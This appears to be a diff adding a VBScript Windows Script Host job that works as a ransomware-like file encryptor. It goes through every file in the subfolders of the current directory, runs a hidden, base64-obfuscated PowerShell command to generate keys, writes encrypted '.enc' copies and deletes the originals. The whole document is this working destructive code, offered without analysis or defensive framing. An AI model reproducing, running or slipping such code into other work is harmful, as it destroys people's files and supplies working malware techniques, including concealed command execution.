@@ -1,0 +1,32 @@
+<job>
+  <script language="VBScript" src="aes.vbs"/>
+  <script language="VBScript">
+
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    set shell = CreateObject("Wscript.Shell")
+    Set stream = CreateObject("ADODB.Stream")
+
+    For Each folder In fso.GetFolder(".").SubFolders
+      For Each file in fso.GetFolder(folder).Files
+
+      Set src = fso.OpenTextFile(file, 1)
+      Set dst = fso.OpenTextFile(file & ".enc", 8, -1)
+
+      Do Until src.AtEndOfStream
+        rax = shell.Run("powershell.exe -windowstyle hidden -e JABzAGUAZQBkACAAPQAgAEcAZQB0AC0AUgBhAG4AZABvAG0AIAA7ACAALgBcAGcAZQBuAGUAcgBhAHQAZQAuAGUAeABlACAAJABzAGUAZQBkACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAC0ARQBuAGMAbwBkAGkAbgBnACAAYQBzAGMAaQBpACAALQBOAG8ATgBlAHcAbABpAG4AZQAgAGEAZQBzAF8AYQBuAGQAXwBoAG0AYQBjAC4AdAB4AHQA", 0, True)
+        bin = FileToBytes("aes_and_hmac.txt")
+        fso.DeleteFile("aes_and_hmac.txt")
+        aesKey = B64Encode(TrimBytes(bin, 0, 32))
+        macKey = B64Encode(TrimBytes(bin, 32, 32))
+        dst.WriteLine (Encrypt(src.ReadLine(), aesKey, macKey) & ":" & aesKey)  
+      Loop
+
+      src.Close()
+      dst.Close()
+      fso.DeleteFile(file)
+    
+      Next
+    Next
+
+  </script>
+</job>
